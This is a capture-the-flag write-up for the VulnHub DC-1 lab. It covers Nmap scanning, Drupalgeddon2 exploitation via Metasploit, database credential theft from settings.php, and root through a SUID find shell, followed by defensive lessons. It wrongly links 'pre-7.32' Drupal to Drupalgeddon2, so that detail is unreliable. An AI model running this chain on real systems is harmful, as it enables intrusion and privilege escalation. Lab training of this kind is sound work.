# DC-1

**Platform:** VulnHub | **Difficulty:** Beginner | **Date:** Nov. 2026

> Author: DCAU — [VulnHub page](https://www.vulnhub.com/entry/dc-1,292/)

## 1. Reconnaissance

Identify the target on the local network, then enumerate open ports and services.

```bash
nmap -sn 10.0.2.0/24
nmap -sC -sV -p- 10.0.2.4
```

- `-sC` runs Nmap's default scripts (banner grabbing, page titles, etc.)
- `-sV` tries to fingerprint the exact service version
- `-p-` scans all 65535 ports instead of just the top 1000

**Observed:**

```
──(divya㉿KaliDivya)-[~/Bureau]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:3d:16:1b brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.12/24 brd 10.0.2.255 scope global dynamic eth0
       valid_lft 482sec preferred_lft 482sec
    inet6 fe80::a00:27ff:fe3d:161b/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
                                                                                                                                                                                                                                            
┌──(divya㉿KaliDivya)-[~/Bureau]
└─$ nmap -sn 10.0.2.0/24                      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-22 15:07 +0100
Nmap scan report for 10.0.2.1
Host is up (0.00041s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00031s latency).
MAC Address: 08:00:27:2B:03:CB (Oracle VirtualBox virtual NIC)
Nmap scan report for dc-1 (10.0.2.4)
Host is up (0.00079s latency).
MAC Address: 08:00:27:19:F0:B0 (Oracle VirtualBox virtual NIC)
Nmap scan report for localhost (10.0.2.12)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.53 seconds
                                                                                                                                                                                                                                            
┌──(divya㉿KaliDivya)-[~/Bureau]
└─$ nmap -sC -sV -p- 10.0.2.4                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-22 15:08 +0100
Nmap scan report for dc-1 (10.0.2.4)
Host is up (0.00033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          48511/tcp   status
|   100024  1          56965/tcp6  status
|   100024  1          58378/udp   status
|_  100024  1          58824/udp6  status
48511/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:19:F0:B0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.68 seconds

```

Typically three ports are open: **22** (SSH), **80** (HTTP/Apache), **111** (RPC/portmapper).

## 2. Enumeration

Port 80 serves a website running **Drupal**.

An outdated Drupal 7 install (pre-7.32) is a strong signal: it's vulnerable to **Drupalgeddon2 (CVE-2018-7600)**, a pre-authentication remote code execution flaw in the Form API.

## 3. Exploitation

Drupalgeddon2 lets an unauthenticated attacker inject and execute PHP code through a crafted request to Drupal's form rendering engine, because user-supplied render array keys were not properly sanitized before being passed to PHP's `call_user_func_array`. Metasploit automates the whole chain.

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.0.2.4
set RPORT 80
run
```

This drops a shell as `www-data`. Stabilize it for a proper interactive session:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Flags collected along the way:**

```bash
www-data@DC-1:/var/www$ cat flag1.txt
www-data@DC-1:/var/www$ cat sites/default/settings.php
```

`flag1.txt` points to the Drupal config file, which holds the MySQL database credentials used by the CMS.

```
[TODO] flag1 content
[TODO] DB credentials found
```

Logging into the database with those credentials and browsing the `users` table confirms the admin account, whose password hash can be overwritten using Drupal's own hashing script (`scripts/password-hash.sh`) to log in via the web UI and grab `flag3` from the dashboard.

```
[TODO] flag3 content
```

## 4. Privilege Escalation

Look for SUID binaries, which run with the privileges of their owner rather than the invoking user:

```bash
find / -perm -4000 2>/dev/null
```

`/usr/bin/find` shows up with the SUID bit set — abnormal, and directly exploitable since `find` can execute arbitrary commands via `-exec`:

```bash
find . -exec /bin/sh -p \; -quit
```

`-p` keeps the shell privileged (prevents bash from dropping the inherited root privileges), `-quit` stops `find` right after the first execution.


```bash
cat /root/thefinalflag.txt
```

```
[TODO] final flag content
```

## 5. Lessons Learned

- An outdated CMS is an easy, pre-packaged entry point — Drupalgeddon2 had public Metasploit modules within days of disclosure, so patching cadence matters as much as the fix itself.
- Config files like `settings.php` are a goldmine for an attacker; database credentials should never be reachable from a compromised web user without further hardening (e.g. separate DB accounts with least privilege).
- SUID should never be set on general-purpose binaries (`find`, `vim`, `less`, `cp`, ...). These are the first things an attacker checks — see [GTFOBins](https://gtfobins.github.io/) for the full list of abusable binaries.
- **Fix:** update Drupal core past 7.32 (or to a maintained major version), remove the SUID bit from `find` (`chmod u-s /usr/bin/find`), and restrict DB user privileges to what the application actually needs.
